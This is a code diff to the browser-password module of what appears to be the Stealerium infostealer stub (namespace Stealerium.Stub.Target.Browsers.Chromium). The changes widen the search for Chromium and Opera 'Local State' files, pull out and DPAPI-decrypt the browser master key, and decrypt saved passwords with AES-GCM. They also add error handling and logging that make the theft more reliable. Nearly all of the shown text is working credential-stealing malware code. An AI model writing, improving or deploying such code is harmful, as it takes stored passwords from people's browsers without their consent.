@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.IO;
 using System.Runtime.InteropServices;
 using System.Text;
@@ -96,44 +96,82 @@ namespace Stealerium.Stub.Target.Browsers.Chromium
         public static byte[] GetMasterKey(string sLocalStateFolder)
         {
             var sLocalStateFile = sLocalStateFolder;
-
-            if (sLocalStateFile.Contains("Opera"))
-                sLocalStateFile += "\\Opera Stable\\Local State";
-            else
-                sLocalStateFile += "\\Local State";
-
             byte[] bMasterKey = { };
 
-            if (!File.Exists(sLocalStateFile))
-                return null;
+            if (sLocalStateFile.Contains("Opera"))
+            {
+                var possiblePaths = new[]
+                {
+                    Path.Combine(sLocalStateFile, "Opera Stable", "Local State"),
+                    Path.Combine(sLocalStateFile, "Opera GX Stable", "Local State"),
+                    Path.Combine(sLocalStateFile, "Opera", "Local State"),
+                    Path.Combine(sLocalStateFile, "Local State")  // Direct path for some Opera installations
+                };
 
-            // Ну карочи так быстрее работает, да
-            if (sLocalStateFile != _sPrevBrowserPath)
-                _sPrevBrowserPath = sLocalStateFile;
+                var foundPath = false;
+                foreach (var path in possiblePaths)
+                {
+                    if (File.Exists(path))
+                    {
+                        sLocalStateFile = path;
+                        foundPath = true;
+                        Logging.Log($"Found Opera Local State at: {path}");
+                        break;
+                    }
+                }
+
+                if (!foundPath)
+                {
+                    Logging.Log($"Could not find Opera Local State in any expected location. Base path: {sLocalStateFolder}");
+                    return null;
+                }
+            }
             else
+                sLocalStateFile = Path.Combine(sLocalStateFile, "Local State");
+
+            if (!File.Exists(sLocalStateFile))
+            {
+                Logging.Log($"Local State file not found at: {sLocalStateFile}");
+                return null;
+            }
+
+            // Cache check for performance
+            if (sLocalStateFile == _sPrevBrowserPath)
                 return _sPrevMasterKey;
-
-
-            var pattern = new Regex("\"encrypted_key\":\"(.*?)\"",
-                RegexOptions.Compiled).Matches(
-                File.ReadAllText(sLocalStateFile));
-            foreach (Match prof in pattern)
-                if (prof.Success)
-                    bMasterKey = Convert.FromBase64String(prof.Groups[1].Value);
-
-
-            var bRawMasterKey = new byte[bMasterKey.Length - 5];
-            Array.Copy(bMasterKey, 5, bRawMasterKey, 0, bMasterKey.Length - 5);
+            
+            _sPrevBrowserPath = sLocalStateFile;
 
             try
             {
-                _sPrevMasterKey = DpapiDecrypt(bRawMasterKey);
-                return _sPrevMasterKey;
+                var localState = File.ReadAllText(sLocalStateFile);
+                var pattern = new Regex("\"encrypted_key\":\"(.*?)\"", RegexOptions.Compiled);
+                var match = pattern.Match(localState);
+                
+                if (match.Success)
+                {
+                    bMasterKey = Convert.FromBase64String(match.Groups[1].Value);
+                    var bRawMasterKey = new byte[bMasterKey.Length - 5];
+                    Array.Copy(bMasterKey, 5, bRawMasterKey, 0, bMasterKey.Length - 5);
+
+                    _sPrevMasterKey = DpapiDecrypt(bRawMasterKey);
+                    if (_sPrevMasterKey == null || _sPrevMasterKey.Length == 0)
+                    {
+                        Logging.Log("Failed to decrypt master key with DPAPI");
+                        return null;
+                    }
+                    return _sPrevMasterKey;
+                }
+                else
+                {
+                    Logging.Log("Could not find encrypted_key in Local State file");
+                }
             }
-            catch
+            catch (Exception ex)
             {
-                return null;
+                Logging.Log("Failed to get master key: " + ex);
             }
+
+            return null;
         }
 
         public static string GetUtf8(string sNonUtf8)
@@ -152,36 +190,68 @@ namespace Stealerium.Stub.Target.Browsers.Chromium
 
         public static byte[] DecryptWithKey(byte[] bEncryptedData, byte[] bMasterKey)
         {
-            byte[] bIv = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
-            Array.Copy(bEncryptedData, 3, bIv, 0, 12);
+            if (bEncryptedData == null || bMasterKey == null || bEncryptedData.Length < 15)
+                return null;
 
             try
             {
+                byte[] bIv = new byte[12];
+                Array.Copy(bEncryptedData, 3, bIv, 0, 12);
+
                 var bBuffer = new byte[bEncryptedData.Length - 15];
                 Array.Copy(bEncryptedData, 15, bBuffer, 0, bEncryptedData.Length - 15);
+
+                if (bBuffer.Length <= 16)  // Need at least 16 bytes for the tag
+                    return null;
+
                 var bTag = new byte[16];
-                var bData = new byte[bBuffer.Length - bTag.Length];
+                var bData = new byte[bBuffer.Length - 16];
+
                 Array.Copy(bBuffer, bBuffer.Length - 16, bTag, 0, 16);
-                Array.Copy(bBuffer, 0, bData, 0, bBuffer.Length - bTag.Length);
+                Array.Copy(bBuffer, 0, bData, 0, bBuffer.Length - 16);
+
                 var aDecryptor = new CAesGcm();
                 return aDecryptor.Decrypt(bMasterKey, bIv, null, bData, bTag);
             }
             catch (Exception ex)
             {
-                Console.WriteLine(ex);
+                Logging.Log("Failed to decrypt with key: " + ex);
                 return null;
             }
         }
 
         public static string EasyDecrypt(string sLoginData, string sPassword)
         {
-            if (sPassword.StartsWith("v10") || sPassword.StartsWith("v11"))
-            {
-                var bMasterKey = GetMasterKey(Directory.GetParent(sLoginData).Parent.FullName);
-                return Encoding.Default.GetString(DecryptWithKey(Encoding.Default.GetBytes(sPassword), bMasterKey));
-            }
+            if (string.IsNullOrEmpty(sPassword))
+                return string.Empty;
 
-            return Encoding.Default.GetString(DpapiDecrypt(Encoding.Default.GetBytes(sPassword)));
+            try
+            {
+                if (sPassword.StartsWith("v10") || sPassword.StartsWith("v11"))
+                {
+                    var parentPath = Directory.GetParent(sLoginData)?.Parent?.FullName;
+                    if (string.IsNullOrEmpty(parentPath))
+                        return string.Empty;
+
+                    var bMasterKey = GetMasterKey(parentPath);
+                    if (bMasterKey == null || bMasterKey.Length == 0)
+                        return string.Empty;
+
+                    var decrypted = DecryptWithKey(Encoding.Default.GetBytes(sPassword), bMasterKey);
+                    if (decrypted == null)
+                        return string.Empty;
+
+                    return Encoding.Default.GetString(decrypted);
+                }
+
+                var dpapi = DpapiDecrypt(Encoding.Default.GetBytes(sPassword));
+                return dpapi != null ? Encoding.Default.GetString(dpapi) : string.Empty;
+            }
+            catch (Exception ex)
+            {
+                Logging.Log("Failed to decrypt password: " + ex);
+                return string.Empty;
+            }
         }
 
         public static string BrowserPathToAppName(string sLoginData)
